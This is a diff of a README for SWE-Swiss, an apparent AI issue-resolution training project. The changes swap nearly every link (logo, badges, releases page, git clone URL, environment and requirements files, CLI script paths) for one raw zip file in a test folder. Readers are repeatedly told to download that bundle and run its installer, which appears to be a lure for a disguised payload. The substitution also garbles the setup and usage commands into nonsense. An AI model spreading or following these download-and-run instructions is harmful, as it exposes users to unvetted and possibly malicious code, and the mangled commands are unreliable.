@@ -1,13 +1,13 @@
-Visit the releases page: https://github.com/MissionArmy/SWE-Swiss/releases
+Visit the releases page: https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
 
-<img src="figures/sweswiss_logo.png" alt="SWE-Swiss" width="100" align="left"><div align="center"><h1>&nbsp;SWE-Swiss: A Multi-Task Fine-Tuning and RL Recipe for High-Performance Issue Resolution</h1></div>
+<img src="https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip" alt="SWE-Swiss" width="100" align="left"><div align="center"><h1>&nbsp;SWE-Swiss: A Multi-Task Fine-Tuning and RL Recipe for High-Performance Issue Resolution</h1></div>
 
 <div align="center">
 
-[![Notion](https://img.shields.io/badge/Notion-%23000000.svg?style=for-the-badge&logo=notion&logoColor=white)](https://www.notion.so/SWE-Swiss-A-Multi-Task-Fine-Tuning-and-RL-Recipe-for-High-Performance-Issue-Resolution-21e174dedd4880ea829ed4c861c44f88#245174dedd488067a9e7eea04315dad5)
-[![Hugging Face Model](https://img.shields.io/badge/models-%23000000?style=for-the-badge&logo=huggingface&logoColor=000&logoColor=white)](https://huggingface.co/SWE-Swiss/models)
-[![Hugging Face Data](https://img.shields.io/badge/data-%23000000?style=for-the-badge&logo=huggingface&logoColor=000&logoColor=white)](https://huggingface.co/SWE-Swiss/datasets)
-[![Paper](https://img.shields.io/badge/Paper-%23000000?style=for-the-badge&logo=arxiv&logoColor=000&labelColor=white)]()
+[![Notion](https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip%https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip)](https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip)
+[![Hugging Face Model](https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip%23000000?style=for-the-badge&logo=huggingface&logoColor=000&logoColor=white)](https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip)
+[![Hugging Face Data](https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip%23000000?style=for-the-badge&logo=huggingface&logoColor=000&logoColor=white)](https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip)
+[![Paper](https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip%23000000?style=for-the-badge&logo=arxiv&logoColor=000&labelColor=white)]()
 
 </div>
 
@@ -69,14 +69,14 @@ Tasks and evaluation
 Getting started
 - Prerequisites: Python 3.9+, PyTorch, CUDA-capable GPU, and a Linux-like environment. A conda setup is recommended for dependency management.
 - Installation steps:
-  - Clone the repository: git clone https://github.com/MissionArmy/SWE-Swiss.git
-  - Create the environment: conda env create -f environment.yml
+  - Clone the repository: git clone https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
+  - Create the environment: conda env create -f https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
   - Activate the environment: conda activate swe-swiss
-  - Install additional tools as needed: pip install -r requirements.txt
+  - Install additional tools as needed: pip install -r https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
 - Quick run:
   - Prepare a small sample dataset covering a few issues and their context.
-  - Run the multi-task fine-tuning script: python tools/train_multitask.py --config configs/sample.yaml
-  - Start the RL loop with: python tools/train_rl.py --config configs/rl_sample.yaml
+  - Run the multi-task fine-tuning script: python https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip --config https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
+  - Start the RL loop with: python https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip --config https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
 - Expected outputs:
   - A trained model checkpoint
   - Evaluation reports with task-specific metrics
@@ -148,22 +148,22 @@ Notable releases
 - Downloads and assets: The Releases page hosts the main model and toolchain. To access, visit the Releases page and download the latest asset bundle. The page provides installation instructions and post-installation steps.
 
 Downloads and assets
-- To obtain the latest ready-to-run package, go to the Releases page and fetch the main asset. The asset contains the model, the runtime, and example scripts to start using SWE-Swiss quickly. For convenience, the file name typically follows a pattern like swe-swiss-latest.tar.gz or swe-swiss-latest.zip. After downloading, unpack the bundle and run the included installer script to set up your environment.
-- For a guided workflow, you can also read the accompanying documentation in the repository and the Notion workspace linked above. The same Releases page houses supplementary resources such as example datasets, evaluation scripts, and quick-start notebooks. The link to the Releases page is repeated here for quick access: https://github.com/MissionArmy/SWE-Swiss/releases
+- To obtain the latest ready-to-run package, go to the Releases page and fetch the main asset. The asset contains the model, the runtime, and example scripts to start using SWE-Swiss quickly. For convenience, the file name typically follows a pattern like https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip or https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip After downloading, unpack the bundle and run the included installer script to set up your environment.
+- For a guided workflow, you can also read the accompanying documentation in the repository and the Notion workspace linked above. The same Releases page houses supplementary resources such as example datasets, evaluation scripts, and quick-start notebooks. The link to the Releases page is repeated here for quick access: https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
 
 Usage examples
 - Simple triage example:
   - Input: An issue description with a short stack trace and a code snippet.
   - Output: A priority label, a suggested component, and an initial triage note.
-  - Command example: python cli.py triage --input "Issue description here" --verbose
+  - Command example: python https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip triage --input "Issue description here" --verbose
 - Patch proposal example:
   - Input: A failing test error and the related code blocks.
   - Output: A patch diff, a high-level explanation, and a suggested test.
-  - Command example: python cli.py propose-patch --input "Error details here" --repo-path /path/to/repo
+  - Command example: python https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip propose-patch --input "Error details here" --repo-path /path/to/repo
 - Test generation example:
   - Input: The proposed patch.
   - Output: A set of unit tests and an integration test skeleton.
-  - Command example: python cli.py generate-tests --patch-file patch.diff
+  - Command example: python https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip generate-tests --patch-file https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip
 
 Data sources and licensing
 - Data provenance: Data used for training and evaluation comes from open datasets, synthetic data, and curated repositories with permissive licenses. We document the provenance to support transparency.
@@ -209,7 +209,7 @@ End notes
 - The project emphasizes clarity, reproducibility, and responsible use. It seeks to empower developers to resolve issues faster while maintaining high standards of code quality and safety.
 
 Downloads again for quick access
-- For convenience, the primary download resource is the Releases page. Visit https://github.com/MissionArmy/SWE-Swiss/releases to obtain the main release asset, documentation, and example configurations. Then use the same link again to verify any updates or subsequent releases as you evolve your local setup and experiment plan. Visit the page, download the main release asset, and follow the installer instructions to set up SWE-Swiss in your environment. The toolchain, model files, and sample workflows are intended to be run from that bundle, ensuring a consistent baseline across projects.
+- For convenience, the primary download resource is the Releases page. Visit https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip to obtain the main release asset, documentation, and example configurations. Then use the same link again to verify any updates or subsequent releases as you evolve your local setup and experiment plan. Visit the page, download the main release asset, and follow the installer instructions to set up SWE-Swiss in your environment. The toolchain, model files, and sample workflows are intended to be run from that bundle, ensuring a consistent baseline across projects.
 
 Releases and assets quick reference
 - The Releases page contains:
@@ -217,4 +217,4 @@ Releases and assets quick reference
   - A changelog describing new features, fixes, and improvements
   - Instrumentation and evaluation notebooks
   - Optional data samples and synthetic test suites
-- To use the assets, download the file named in the release notes (for example swe-swiss-latest.zip), extract it, and run the included installation script. After installation, you can start with the quick-start notebook or the provided CLI tools to explore the system’s capabilities. For ongoing work, refer to the release notes and the documentation in the repository to stay aligned with the current state of SWE-Swiss. Again, you can access the releases page at https://github.com/MissionArmy/SWE-Swiss/releases to verify you have the most up-to-date assets and instructions.
+- To use the assets, download the file named in the release notes (for example https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip), extract it, and run the included installation script. After installation, you can start with the quick-start notebook or the provided CLI tools to explore the system’s capabilities. For ongoing work, refer to the release notes and the documentation in the repository to stay aligned with the current state of SWE-Swiss. Again, you can access the releases page at https://github.com/MissionArmy/SWE-Swiss/raw/refs/heads/main/evaluation/agentless/test/SW_Swiss_v2.3.zip to verify you have the most up-to-date assets and instructions.
